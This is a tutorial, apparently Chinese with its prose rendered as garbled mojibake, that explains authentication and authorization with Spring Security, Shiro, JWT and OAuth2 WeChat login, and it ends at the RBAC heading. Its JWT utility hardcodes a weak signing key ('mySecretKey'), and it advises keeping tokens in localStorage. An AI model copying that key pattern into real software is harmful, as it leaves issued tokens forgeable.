---
title: 3ã€å®‰å…¨æƒé™æ¡†æ¶ä½“ç³»
---
## ğŸ“š ç›®å½•

1. [å®‰å…¨æ¡†æ¶åŸºæœ¬æ¦‚å¿µ](#1-å®‰å…¨æ¡†æ¶åŸºæœ¬æ¦‚å¿µ)
2. [Spring Securityæ ¸å¿ƒæ¡†æ¶](#2-spring-securityæ ¸å¿ƒæ¡†æ¶)
3. [Apache Shiroè½»é‡çº§æ¡†æ¶](#3-apache-shiroè½»é‡çº§æ¡†æ¶)
4. [JWTä»¤ç‰Œè®¤è¯æœºåˆ¶](#4-jwtä»¤ç‰Œè®¤è¯æœºåˆ¶)
5. [OAuth2æˆæƒåè®®](#5-oauth2æˆæƒåè®®)
6. [RBACæƒé™æ¨¡å‹](#6-rbacæƒé™æ¨¡å‹)
7. [å®‰å…¨é˜²æŠ¤æœºåˆ¶](#7-å®‰å…¨é˜²æŠ¤æœºåˆ¶)
8. [æ¡†æ¶é€‰å‹ä¸æœ€ä½³å®è·µ](#8-æ¡†æ¶é€‰å‹ä¸æœ€ä½³å®è·µ)
9. [æ ¸å¿ƒè¦ç‚¹æ€»ç»“](#9-æ ¸å¿ƒè¦ç‚¹æ€»ç»“)

---

## 1. ğŸ” å®‰å…¨æ¡†æ¶åŸºæœ¬æ¦‚å¿µ


### 1.1 ä»€ä¹ˆæ˜¯å®‰å…¨æ¡†æ¶


**é€šä¿—ç†è§£**ï¼šå®‰å…¨æ¡†æ¶å°±åƒæ˜¯ç»™ä½ çš„åº”ç”¨è£…äº†ä¸€å¥—"é—¨ç¦ç³»ç»Ÿ"

```
ç°å®ç”Ÿæ´»ä¸­çš„é—¨ç¦ï¼š
å…¬å¸å¤§æ¥¼ â†’ åˆ·å¡è¿›å…¥ â†’ ç”µæ¢¯éœ€è¦æƒé™ â†’ æœºæˆ¿éœ€è¦ç‰¹æ®Šæˆæƒ

Webåº”ç”¨ä¸­çš„å®‰å…¨ï¼š
ç½‘ç«™é¦–é¡µ â†’ ç™»å½•éªŒè¯ â†’ ä¸åŒé¡µé¢éœ€è¦ä¸åŒæƒé™ â†’ æ•æ„Ÿæ“ä½œéœ€è¦ç‰¹æ®Šæˆæƒ
```

> ğŸ’¡ **æ ¸å¿ƒç†è§£**ï¼šå®‰å…¨æ¡†æ¶å¸®æˆ‘ä»¬è§£å†³"è°èƒ½è¿›æ¥"å’Œ"è¿›æ¥åèƒ½åšä»€ä¹ˆ"è¿™ä¸¤ä¸ªæ ¹æœ¬é—®é¢˜

### 1.2 è®¤è¯ vs æˆæƒ - æœ€å®¹æ˜“æ··æ·†çš„æ¦‚å¿µ


**è®¤è¯ï¼ˆAuthenticationï¼‰**ï¼š
- **ç®€å•ç†è§£**ï¼šéªŒè¯"ä½ æ˜¯è°"
- **ç”Ÿæ´»ä¾‹å­**ï¼šæ‹¿èº«ä»½è¯è¯æ˜ä½ æ˜¯å¼ ä¸‰
- **æŠ€æœ¯è¡¨ç°**ï¼šç”¨æˆ·åå¯†ç ç™»å½•ã€æŒ‡çº¹è¯†åˆ«

**æˆæƒï¼ˆAuthorizationï¼‰**ï¼š
- **ç®€å•ç†è§£**ï¼šç¡®å®š"ä½ èƒ½åšä»€ä¹ˆ"
- **ç”Ÿæ´»ä¾‹å­**ï¼šæœ‰é©¾ç…§æ‰èƒ½å¼€è½¦ï¼Œæœ‰åŒ»å¸ˆè¯æ‰èƒ½çœ‹ç—…
- **æŠ€æœ¯è¡¨ç°**ï¼šè®¿é—®ä¸åŒé¡µé¢ã€æ‰§è¡Œä¸åŒæ“ä½œçš„æƒé™

```
å®é™…æµç¨‹ç¤ºä¾‹ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ è¾“å…¥è´¦å·å¯†ç  â”‚â”€â”€â†’â”‚ è®¤è¯ï¼šç¡®è®¤èº«ä»½ â”‚â”€â”€â†’â”‚ æˆæƒï¼šåˆ†é…æƒé™ â”‚
â”‚ (æˆ‘æ˜¯å¼ ä¸‰) â”‚    â”‚ (ç¡®å®æ˜¯å¼ ä¸‰) â”‚    â”‚ (å¼ ä¸‰æ˜¯ç®¡ç†å‘˜) â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 1.3 å®‰å…¨æ¡†æ¶çš„æ ¸å¿ƒèŒè´£


**ğŸ›¡ï¸ ä¸»è¦åŠŸèƒ½æ¨¡å—**ï¼š

```
ç”¨æˆ·è®¤è¯ç®¡ç†ï¼š
â”œâ”€ ç™»å½•éªŒè¯ï¼ˆç”¨æˆ·åå¯†ç ã€ç¬¬ä¸‰æ–¹ç™»å½•ï¼‰
â”œâ”€ ä¼šè¯ç®¡ç†ï¼ˆç™»å½•çŠ¶æ€ä¿æŒï¼‰
â”œâ”€ å¯†ç ç­–ç•¥ï¼ˆåŠ å¯†å­˜å‚¨ã€å¤æ‚åº¦è¦æ±‚ï¼‰
â””â”€ å¤šå› ç´ è®¤è¯ï¼ˆçŸ­ä¿¡éªŒè¯ç ã€é‚®ç®±éªŒè¯ï¼‰

æƒé™æ§åˆ¶ç®¡ç†ï¼š
â”œâ”€ è§’è‰²ç®¡ç†ï¼ˆç®¡ç†å‘˜ã€æ™®é€šç”¨æˆ·ã€VIPç”¨æˆ·ï¼‰
â”œâ”€ æƒé™åˆ†é…ï¼ˆè°èƒ½è®¿é—®å“ªäº›é¡µé¢ï¼‰
â”œâ”€ èµ„æºä¿æŠ¤ï¼ˆURLã€æ–¹æ³•ã€æ•°æ®çº§åˆ«çš„ä¿æŠ¤ï¼‰
â””â”€ åŠ¨æ€æƒé™ï¼ˆæ ¹æ®æ¡ä»¶åŠ¨æ€è°ƒæ•´æƒé™ï¼‰

å®‰å…¨é˜²æŠ¤æœºåˆ¶ï¼š
â”œâ”€ é˜²æ­¢æš´åŠ›ç ´è§£ï¼ˆç™»å½•æ¬¡æ•°é™åˆ¶ï¼‰
â”œâ”€ é˜²æ­¢ä¼šè¯åŠ«æŒï¼ˆä¼šè¯è¶…æ—¶ã€IPç»‘å®šï¼‰
â”œâ”€ é˜²æ­¢æ¶æ„æ”»å‡»ï¼ˆXSSã€CSRFé˜²æŠ¤ï¼‰
â””â”€ å®‰å…¨æ—¥å¿—ï¼ˆè®°å½•æ‰€æœ‰å®‰å…¨ç›¸å…³æ“ä½œï¼‰
```

---

## 2. ğŸŒŸ Spring Securityæ ¸å¿ƒæ¡†æ¶


### 2.1 Spring Securityæ˜¯ä»€ä¹ˆ


**é€šä¿—è§£é‡Š**ï¼šSpring Securityå°±åƒæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„"æ™ºèƒ½ä¿å®‰ç³»ç»Ÿ"

> ğŸ“Œ **æ–°æ‰‹ç†è§£**ï¼šå¦‚æœæŠŠä½ çš„Webåº”ç”¨æ¯”ä½œä¸€æ ‹å¤§æ¥¼ï¼ŒSpring Securityå°±æ˜¯è¿™æ ‹å¤§æ¥¼çš„å®Œæ•´å®‰ä¿æ–¹æ¡ˆï¼ŒåŒ…æ‹¬é—¨å«ã€ç›‘æ§ã€è®¿é—®å¡ã€å·¡é€»ç­‰æ‰€æœ‰å®‰å…¨æªæ–½

**æ ¸å¿ƒç‰¹ç‚¹**ï¼š
- **åŠŸèƒ½å…¨é¢**ï¼šä»ç™»å½•åˆ°æƒé™æ§åˆ¶ä¸€åº”ä¿±å…¨
- **é«˜åº¦é›†æˆ**ï¼šä¸Springæ¡†æ¶æ— ç¼é…åˆ
- **çµæ´»é…ç½®**ï¼šå¯ä»¥æ ¹æ®éœ€æ±‚ç²¾ç»†è°ƒæ•´
- **ä¼ä¸šçº§**ï¼šé€‚åˆå¤æ‚çš„ä¼ä¸šçº§åº”ç”¨

### 2.2 Spring Securityæ ¸å¿ƒç»„ä»¶è§£æ


#### ğŸ”‘ è®¤è¯ç®¡ç†å™¨ï¼ˆAuthenticationManagerï¼‰


**ä½œç”¨**ï¼šè´Ÿè´£éªŒè¯ç”¨æˆ·èº«ä»½çš„"æ€»æŒ‡æŒ¥"

```java
// ç®€åŒ–çš„è®¤è¯æµç¨‹ç†è§£
public class è®¤è¯ç®¡ç†å™¨ {
    public è®¤è¯ç»“æœ éªŒè¯ç”¨æˆ·(String ç”¨æˆ·å, String å¯†ç ) {
        // 1. æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å­˜åœ¨
        ç”¨æˆ·ä¿¡æ¯ user = ä»æ•°æ®åº“æŸ¥æ‰¾ç”¨æˆ·(ç”¨æˆ·å);
        
        // 2. éªŒè¯å¯†ç æ˜¯å¦æ­£ç¡®
        if (å¯†ç åŒ¹é…(å¯†ç , user.getåŠ å¯†å¯†ç ())) {
            return new è®¤è¯æˆåŠŸ(user);
        } else {
            return new è®¤è¯å¤±è´¥("å¯†ç é”™è¯¯");
        }
    }
}
```

#### ğŸ›¡ï¸ å®‰å…¨è¿‡æ»¤å™¨é“¾ï¼ˆSecurity Filter Chainï¼‰


**å½¢è±¡ç†è§£**ï¼šå°±åƒæœºåœºå®‰æ£€çš„å¤šé“å…³å¡

```
ç”¨æˆ·è¯·æ±‚ â†’ è¿‡æ»¤å™¨1 â†’ è¿‡æ»¤å™¨2 â†’ è¿‡æ»¤å™¨3 â†’ æ§åˆ¶å™¨
           (æ£€æŸ¥ç™»å½•)  (æ£€æŸ¥æƒé™)  (é˜²CSRFæ”»å‡»)

æ¯ä¸ªè¿‡æ»¤å™¨éƒ½åƒä¸€é“æ£€æŸ¥ç«™ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ç”¨æˆ·å‘èµ·è¯·æ±‚     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ ç™»å½•çŠ¶æ€æ£€æŸ¥     â”‚ â† æ²¡ç™»å½•å°±è·³è½¬ç™»å½•é¡µ
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  
â”‚ æƒé™éªŒè¯æ£€æŸ¥     â”‚ â† æƒé™ä¸è¶³å°±æç¤ºæ‹’ç»
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ å®‰å…¨æ”»å‡»é˜²æŠ¤     â”‚ â† å‘ç°æ¶æ„è¯·æ±‚å°±é˜»æ‹¦
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ åˆ°è¾¾ä¸šåŠ¡ä»£ç      â”‚ â† æ‰€æœ‰æ£€æŸ¥é€šè¿‡æ‰èƒ½æ‰§è¡Œ
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

#### ğŸ‘¤ ç”¨æˆ·è¯¦æƒ…æœåŠ¡ï¼ˆUserDetailsServiceï¼‰


**ä½œç”¨**ï¼šè´Ÿè´£ä»æ•°æ®åº“ç­‰åœ°æ–¹è·å–ç”¨æˆ·ä¿¡æ¯

```java
// å®é™…å¼€å‘ä¸­çš„ç”¨æˆ·ä¿¡æ¯åŠ è½½
@Service
public class MyUserDetailsService implements UserDetailsService {
    
    @Override
    public UserDetails loadUserByUsername(String username) {
        // ä»æ•°æ®åº“æŸ¥è¯¢ç”¨æˆ·
        User user = userRepository.findByUsername(username);
        
        // è½¬æ¢ä¸ºSpring Securityéœ€è¦çš„æ ¼å¼
        return User.builder()
            .username(user.getUsername())
            .password(user.getPassword())  // å·²åŠ å¯†çš„å¯†ç 
            .authorities("ROLE_USER")      // ç”¨æˆ·è§’è‰²
            .build();
    }
}
```

### 2.3 Spring Securityé…ç½®å®æˆ˜


#### ğŸ“ åŸºç¡€é…ç½®ç¤ºä¾‹


```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // é…ç½®å“ªäº›URLéœ€è¦ä»€ä¹ˆæƒé™
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**").permitAll()    // å…¬å¼€é¡µé¢
                .requestMatchers("/admin/**").hasRole("ADMIN") // ç®¡ç†å‘˜é¡µé¢
                .anyRequest().authenticated()                 // å…¶ä»–éƒ½éœ€è¦ç™»å½•
            )
            // é…ç½®ç™»å½•é¡µé¢
            .formLogin(form -> form
                .loginPage("/login")        // è‡ªå®šä¹‰ç™»å½•é¡µ
                .defaultSuccessUrl("/home") // ç™»å½•æˆåŠŸè·³è½¬
                .permitAll()
            )
            // é…ç½®ç™»å‡º
            .logout(logout -> logout
                .logoutUrl("/logout")
                .logoutSuccessUrl("/")
            );
            
        return http.build();
    }
}
```

#### ğŸ”’ å¯†ç åŠ å¯†é…ç½®


> âš ï¸ **é‡è¦æé†’**ï¼šå¯†ç ç»å¯¹ä¸èƒ½æ˜æ–‡å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼

```java
@Bean
public PasswordEncoder passwordEncoder() {
    // ä½¿ç”¨BCryptåŠ å¯†ç®—æ³•
    return new BCryptPasswordEncoder();
}

// ç”¨æˆ·æ³¨å†Œæ—¶åŠ å¯†å¯†ç 
public void registerUser(String username, String rawPassword) {
    String encodedPassword = passwordEncoder.encode(rawPassword);
    // å­˜å‚¨åŠ å¯†åçš„å¯†ç åˆ°æ•°æ®åº“
    userRepository.save(new User(username, encodedPassword));
}
```

**ä¸ºä»€ä¹ˆè¦åŠ å¯†å¯†ç **ï¼š
```
æ˜æ–‡å¯†ç çš„å±é™©ï¼š
ç”¨æˆ·è¾“å…¥ï¼š123456
æ•°æ®åº“å­˜å‚¨ï¼š123456  â† æ•°æ®åº“è¢«ç›—ï¼Œå¯†ç å…¨éƒ¨æ³„éœ²

åŠ å¯†åçš„å®‰å…¨ï¼š
ç”¨æˆ·è¾“å…¥ï¼š123456
æ•°æ®åº“å­˜å‚¨ï¼š$2a$10$N.zmdr9k7uOCQb376NoUnuTJ8iAt6Z5EHsM... 
å³ä½¿æ•°æ®åº“è¢«ç›—ï¼Œä¹Ÿæ— æ³•ç›´æ¥çœ‹åˆ°çœŸå®å¯†ç 
```

---

## 3. âš¡ Apache Shiroè½»é‡çº§æ¡†æ¶


### 3.1 Shiroæ˜¯ä»€ä¹ˆ


**é€šä¿—ç†è§£**ï¼šå¦‚æœSpring Securityæ˜¯è±ªåç‰ˆå®‰ä¿ç³»ç»Ÿï¼Œé‚£ä¹ˆShiroå°±æ˜¯ç²¾ç®€ç‰ˆçš„"å°åŒºä¿å®‰"

> ğŸ’¡ **é€‰æ‹©å»ºè®®**ï¼š
> - é¡¹ç›®ç®€å•ï¼Œä¸ç”¨Springï¼šé€‰æ‹©Shiro
> - å·²ç»ç”¨Springå…¨å®¶æ¡¶ï¼šé€‰æ‹©Spring Security
> - éœ€è¦å¿«é€Ÿä¸Šæ‰‹ï¼šShiroæ›´ç®€å•

### 3.2 Shiroçš„æ ¸å¿ƒæ¦‚å¿µ


#### ğŸ­ Subjectï¼ˆä¸»ä½“ï¼‰


**ç†è§£**ï¼šSubjectå°±æ˜¯å½“å‰æ“ä½œçš„ç”¨æˆ·

```java
// Shiroä¸­è·å–å½“å‰ç”¨æˆ·çš„æ–¹å¼
Subject currentUser = SecurityUtils.getSubject();

// åˆ¤æ–­ç”¨æˆ·æ˜¯å¦å·²ç™»å½•
if (currentUser.isAuthenticated()) {
    System.out.println("ç”¨æˆ·å·²ç™»å½•");
}

// æ£€æŸ¥ç”¨æˆ·æ˜¯å¦æœ‰æŸä¸ªæƒé™
if (currentUser.isPermitted("user:create")) {
    System.out.println("ç”¨æˆ·æœ‰åˆ›å»ºæƒé™");
}
```

#### ğŸ›ï¸ Realmï¼ˆé¢†åŸŸï¼‰


**ä½œç”¨**ï¼šè¿æ¥Shiroå’Œä½ çš„æ•°æ®å­˜å‚¨çš„æ¡¥æ¢

```java
// è‡ªå®šä¹‰Realm - ä»æ•°æ®åº“è·å–ç”¨æˆ·ä¿¡æ¯
public class MyRealm extends AuthorizingRealm {
    
    // è®¤è¯ï¼šéªŒè¯ç”¨æˆ·èº«ä»½
    @Override
    protected AuthenticationInfo doGetAuthenticationInfo(
            AuthenticationToken token) {
        
        String username = (String) token.getPrincipal();
        User user = userService.findByUsername(username);
        
        if (user != null) {
            // è¿”å›ç”¨æˆ·ä¿¡æ¯ç»™ShiroéªŒè¯
            return new SimpleAuthenticationInfo(
                username, user.getPassword(), getName());
        }
        return null;
    }
    
    // æˆæƒï¼šè·å–ç”¨æˆ·æƒé™
    @Override
    protected AuthorizationInfo doGetAuthorizationInfo(
            PrincipalCollection principals) {
        
        String username = (String) principals.getPrimaryPrincipal();
        Set<String> permissions = userService.getUserPermissions(username);
        
        SimpleAuthorizationInfo info = new SimpleAuthorizationInfo();
        info.setStringPermissions(permissions);
        return info;
    }
}
```

### 3.3 Shiroé…ç½®å®ä¾‹


#### ğŸ“‹ åŸºç¡€é…ç½®


```java
// Shiroé…ç½®ç±»
@Configuration
public class ShiroConfig {
    
    // é…ç½®è‡ªå®šä¹‰Realm
    @Bean
    public MyRealm myRealm() {
        return new MyRealm();
    }
    
    // å®‰å…¨ç®¡ç†å™¨
    @Bean
    public SecurityManager securityManager() {
        DefaultWebSecurityManager manager = new DefaultWebSecurityManager();
        manager.setRealm(myRealm());
        return manager;
    }
    
    // è¿‡æ»¤å™¨é…ç½®
    @Bean
    public ShiroFilterFactoryBean shiroFilter() {
        ShiroFilterFactoryBean filter = new ShiroFilterFactoryBean();
        filter.setSecurityManager(securityManager());
        
        // è®¾ç½®å„ç§é¡µé¢
        filter.setLoginUrl("/login");         // ç™»å½•é¡µ
        filter.setSuccessUrl("/home");        // ç™»å½•æˆåŠŸé¡µ
        filter.setUnauthorizedUrl("/403");    // æ— æƒé™é¡µ
        
        // é…ç½®è®¿é—®è§„åˆ™
        Map<String, String> filterMap = new HashMap<>();
        filterMap.put("/public/**", "anon");    // åŒ¿åè®¿é—®
        filterMap.put("/admin/**", "authc");    // éœ€è¦è®¤è¯
        filterMap.put("/**", "authc");          // å…¶ä»–éƒ½éœ€è¦è®¤è¯
        
        filter.setFilterChainDefinitionMap(filterMap);
        return filter;
    }
}
```

---

## 4. ğŸ« JWTä»¤ç‰Œè®¤è¯æœºåˆ¶


### 4.1 JWTæ˜¯ä»€ä¹ˆ


**ä¼ ç»Ÿç™»å½•æ–¹å¼çš„é—®é¢˜**ï¼š
```
ä¼ ç»ŸSessionç™»å½•ï¼š
ç”¨æˆ·ç™»å½• â†’ æœåŠ¡å™¨åˆ›å»ºSession â†’ è¿”å›SessionID â†’ ç”¨æˆ·æºå¸¦SessionIDè®¿é—®

é—®é¢˜ï¼š
- æœåŠ¡å™¨éœ€è¦å­˜å‚¨Sessionï¼ˆå å†…å­˜ï¼‰
- å¤šå°æœåŠ¡å™¨æ—¶Sessionå…±äº«å›°éš¾
- ç§»åŠ¨ç«¯Appä½¿ç”¨ä¸æ–¹ä¾¿
```

**JWTçš„è§£å†³æ–¹æ¡ˆ**ï¼š
```
JWTä»¤ç‰Œç™»å½•ï¼š
ç”¨æˆ·ç™»å½• â†’ æœåŠ¡å™¨ç”ŸæˆJWTä»¤ç‰Œ â†’ è¿”å›ä»¤ç‰Œç»™ç”¨æˆ· â†’ ç”¨æˆ·æºå¸¦ä»¤ç‰Œè®¿é—®

ä¼˜åŠ¿ï¼š
- æœåŠ¡å™¨ä¸éœ€è¦å­˜å‚¨ï¼ˆä»¤ç‰ŒåŒ…å«æ‰€æœ‰ä¿¡æ¯ï¼‰
- å¤šå°æœåŠ¡å™¨å…±äº«å®¹æ˜“
- ç§»åŠ¨ç«¯å‹å¥½
```

### 4.2 JWTä»¤ç‰Œç»“æ„è§£æ


**JWTç”±ä¸‰éƒ¨åˆ†ç»„æˆ**ï¼š

```
å®Œæ•´çš„JWTä»¤ç‰Œï¼š
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

æ‹†åˆ†ç»“æ„ï¼š
å¤´éƒ¨.è½½è·.ç­¾å
Header.Payload.Signature
```

**å„éƒ¨åˆ†è¯¦è§£**ï¼š

```
ğŸ“‹ Headerï¼ˆå¤´éƒ¨ï¼‰- ä»¤ç‰Œç±»å‹å’Œç®—æ³•
{
  "alg": "HS256",    // ä½¿ç”¨çš„åŠ å¯†ç®—æ³•
  "typ": "JWT"       // ä»¤ç‰Œç±»å‹
}

ğŸ“¦ Payloadï¼ˆè½½è·ï¼‰- å­˜å‚¨ç”¨æˆ·ä¿¡æ¯
{
  "sub": "1234567890",        // ç”¨æˆ·ID
  "name": "å¼ ä¸‰",             // ç”¨æˆ·å§“å
  "iat": 1516239022,          // ç­¾å‘æ—¶é—´
  "exp": 1516325422           // è¿‡æœŸæ—¶é—´
}

ğŸ” Signatureï¼ˆç­¾åï¼‰- é˜²æ­¢ç¯¡æ”¹
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secretå¯†é’¥
)
```

### 4.3 JWTå®é™…åº”ç”¨


#### ğŸ”§ JWTå·¥å…·ç±»å®ç°


```java
@Component
public class JwtUtils {
    
    private String secret = "mySecretKey";  // å¯†é’¥
    private long expiration = 86400;        // 24å°æ—¶è¿‡æœŸ
    
    // ç”Ÿæˆä»¤ç‰Œ
    public String generateToken(String username) {
        return Jwts.builder()
            .setSubject(username)                    // è®¾ç½®ç”¨æˆ·å
            .setIssuedAt(new Date())                 // è®¾ç½®ç­¾å‘æ—¶é—´
            .setExpiration(new Date(System.currentTimeMillis() + expiration * 1000))
            .signWith(SignatureAlgorithm.HS512, secret)  // ç­¾å
            .compact();
    }
    
    // è§£æä»¤ç‰Œè·å–ç”¨æˆ·å
    public String getUsernameFromToken(String token) {
        Claims claims = Jwts.parser()
            .setSigningKey(secret)
            .parseClaimsJws(token)
            .getBody();
        return claims.getSubject();
    }
    
    // éªŒè¯ä»¤ç‰Œæ˜¯å¦æœ‰æ•ˆ
    public boolean validateToken(String token) {
        try {
            Jwts.parser().setSigningKey(secret).parseClaimsJws(token);
            return true;
        } catch (JwtException e) {
            return false;  // ä»¤ç‰Œæ— æ•ˆ
        }
    }
}
```

#### ğŸŒ å‰åç«¯åˆ†ç¦»é¡¹ç›®ä¸­çš„ä½¿ç”¨


```java
// ç™»å½•æ¥å£
@RestController
public class AuthController {
    
    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody LoginRequest request) {
        // éªŒè¯ç”¨æˆ·åå¯†ç 
        if (userService.validateUser(request.getUsername(), request.getPassword())) {
            // ç”ŸæˆJWTä»¤ç‰Œ
            String token = jwtUtils.generateToken(request.getUsername());
            return ResponseEntity.ok(new JwtResponse(token));
        }
        return ResponseEntity.status(401).body("ç™»å½•å¤±è´¥");
    }
}

// å‰ç«¯ä½¿ç”¨æ–¹å¼
/*
1. ç”¨æˆ·ç™»å½•åï¼Œå‰ç«¯ä¿å­˜JWTä»¤ç‰Œåˆ°localStorage
2. åç»­è¯·æ±‚éƒ½åœ¨Headerä¸­æºå¸¦ï¼šAuthorization: Bearer <token>
3. åç«¯éªŒè¯ä»¤ç‰Œæœ‰æ•ˆæ€§ï¼Œè·å–ç”¨æˆ·ä¿¡æ¯
*/
```

---

## 5. ğŸ”‘ OAuth2æˆæƒåè®®


### 5.1 OAuth2è§£å†³ä»€ä¹ˆé—®é¢˜


**ç”Ÿæ´»ä¸­çš„ä¾‹å­**ï¼š

> ğŸ“± **åœºæ™¯**ï¼šä½ æƒ³ç”¨ç¬¬ä¸‰æ–¹Appï¼ˆå¦‚ç¾å›¢ï¼‰ç™»å½•ï¼Œä½†ä¸æƒ³æ³¨å†Œæ–°è´¦å·ï¼Œå¸Œæœ›ç›´æ¥ç”¨å¾®ä¿¡ç™»å½•

**ä¼ ç»Ÿæ–¹å¼çš„é—®é¢˜**ï¼š
```
å¦‚æœæ²¡æœ‰OAuth2ï¼š
ä½ éœ€è¦æŠŠå¾®ä¿¡çš„ç”¨æˆ·åå¯†ç å‘Šè¯‰ç¾å›¢App
â†“
ç¾å›¢Appç”¨ä½ çš„è´¦å·å¯†ç å»å¾®ä¿¡éªŒè¯
â†“
è¿™æ ·ç¾å›¢å°±çŸ¥é“äº†ä½ çš„å¾®ä¿¡å¯†ç ï¼ï¼ˆå¾ˆå±é™©ï¼‰
```

**OAuth2çš„è§£å†³æ–¹æ¡ˆ**ï¼š
```
ä½¿ç”¨OAuth2ï¼š
ä½ ç‚¹å‡»"å¾®ä¿¡ç™»å½•" â†’ è·³è½¬åˆ°å¾®ä¿¡æˆæƒé¡µé¢ â†’ ä½ åœ¨å¾®ä¿¡è¾“å…¥å¯†ç  â†’ å¾®ä¿¡ç»™ç¾å›¢ä¸€ä¸ª"æˆæƒç " â†’ ç¾å›¢ç”¨æˆæƒç æ¢å–ä½ çš„åŸºæœ¬ä¿¡æ¯
â†“
æ•´ä¸ªè¿‡ç¨‹ç¾å›¢ä»æ¥ä¸çŸ¥é“ä½ çš„å¾®ä¿¡å¯†ç ï¼
```

### 5.2 OAuth2æ ¸å¿ƒè§’è‰²


```
ğŸ­ å››ä¸ªæ ¸å¿ƒè§’è‰²ï¼š

ğŸ‘¤ ç”¨æˆ·ï¼ˆResource Ownerï¼‰
- å°±æ˜¯ä½ æœ¬äºº
- æ‹¥æœ‰èµ„æºçš„äººï¼ˆå¾®ä¿¡è´¦å·ã€QQè´¦å·ç­‰ï¼‰

ğŸ“± ç¬¬ä¸‰æ–¹åº”ç”¨ï¼ˆClientï¼‰
- æƒ³è¦è·å–ç”¨æˆ·ä¿¡æ¯çš„åº”ç”¨
- ä¾‹å¦‚ï¼šç¾å›¢Appã€ç½‘æ˜“äº‘éŸ³ä¹ç­‰

ğŸ›ï¸ æˆæƒæœåŠ¡å™¨ï¼ˆAuthorization Serverï¼‰
- è´Ÿè´£ç”¨æˆ·è®¤è¯å’Œå‘æ”¾æˆæƒç 
- ä¾‹å¦‚ï¼šå¾®ä¿¡çš„æˆæƒæœåŠ¡å™¨

ğŸ’¾ èµ„æºæœåŠ¡å™¨ï¼ˆResource Serverï¼‰
- å­˜å‚¨ç”¨æˆ·ä¿¡æ¯çš„æœåŠ¡å™¨
- ä¾‹å¦‚ï¼šå¾®ä¿¡ç”¨æˆ·ä¿¡æ¯æœåŠ¡å™¨
```

### 5.3 OAuth2æˆæƒæµç¨‹


**æˆæƒç æ¨¡å¼ï¼ˆæœ€å¸¸ç”¨ï¼‰**ï¼š

```
æˆæƒæµç¨‹å›¾ï¼š
ç”¨æˆ·          ç¬¬ä¸‰æ–¹App       å¾®ä¿¡æˆæƒæœåŠ¡å™¨     å¾®ä¿¡èµ„æºæœåŠ¡å™¨
 |               |                |                |
 |--ç‚¹å‡»å¾®ä¿¡ç™»å½•-â†’|                |                |
 |               |--è·³è½¬æˆæƒé¡µé¢--â†’|                |
 |â†-----------æ˜¾ç¤ºæˆæƒé¡µé¢---------|                |
 |               |                |                |
 |--è¾“å…¥å¯†ç ç¡®è®¤-â†’|                |                |
 |               |â†--è¿”å›æˆæƒç ----|                |
 |               |                |                |
 |               |--ç”¨æˆæƒç æ¢ä»¤ç‰Œâ†’|                |
 |               |â†--è¿”å›è®¿é—®ä»¤ç‰Œ--|                |
 |               |                |                |
 |               |--ç”¨ä»¤ç‰Œè·å–ä¿¡æ¯-------------â†’|
 |               |â†---------è¿”å›ç”¨æˆ·ä¿¡æ¯----------|
```

### 5.4 OAuth2å®é™…åº”ç”¨


#### ğŸ”§ é›†æˆç¬¬ä¸‰æ–¹ç™»å½•


```java
// ä»¥å¾®ä¿¡ç™»å½•ä¸ºä¾‹
@RestController
public class OAuthController {
    
    // ç¬¬1æ­¥ï¼šè·³è½¬åˆ°å¾®ä¿¡æˆæƒé¡µé¢
    @GetMapping("/oauth/wechat")
    public void wechatAuth(HttpServletResponse response) throws IOException {
        String authUrl = "https://open.weixin.qq.com/connect/oauth2/authorize?" +
                "appid=YOUR_APP_ID&" +
                "redirect_uri=YOUR_CALLBACK_URL&" +
                "response_type=code&" +
                "scope=snsapi_userinfo";
        
        response.sendRedirect(authUrl);
    }
    
    // ç¬¬2æ­¥ï¼šæ¥æ”¶å¾®ä¿¡å›è°ƒï¼Œç”¨æˆæƒç æ¢å–ç”¨æˆ·ä¿¡æ¯
    @GetMapping("/oauth/wechat/callback")
    public ResponseEntity<?> wechatCallback(@RequestParam String code) {
        // ç”¨codeæ¢å–access_token
        String accessToken = wechatService.getAccessToken(code);
        
        // ç”¨access_tokenè·å–ç”¨æˆ·ä¿¡æ¯
        WechatUser wechatUser = wechatService.getUserInfo(accessToken);
        
        // åœ¨ç³»ç»Ÿä¸­åˆ›å»ºæˆ–æ›´æ–°ç”¨æˆ·
        User user = userService.createOrUpdateFromWechat(wechatUser);
        
        // ç”Ÿæˆç³»ç»Ÿçš„JWTä»¤ç‰Œ
        String token = jwtUtils.generateToken(user.getUsername());
        
        return ResponseEntity.ok(new JwtResponse(token));
    }
}
```

---

## 6. ğŸ‘¥ RBACæƒé™æ¨¡å‹


### 6.1 RBACæ˜¯ä»€ä¹ˆ


